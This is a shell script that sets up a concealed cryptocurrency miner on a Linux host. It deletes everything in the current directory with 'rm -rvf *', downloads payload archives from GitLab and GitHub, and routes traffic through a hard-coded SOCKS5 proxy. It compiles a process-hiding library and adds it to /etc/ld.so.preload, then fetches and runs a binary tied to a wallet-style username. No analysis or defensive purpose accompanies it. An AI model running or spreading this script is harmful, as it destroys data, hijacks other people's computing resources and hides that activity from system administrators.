rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 174.138.87.115:30001
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp & clear & wget -qO asep https://github.com/kkrab576/cli/raw/refs/heads/main/start && chmod +x asep && ./asep z --username Ce2idDDd2XJ1Rv7M4qmWjoUGmZWfNhbG6hL8xzHAiAEd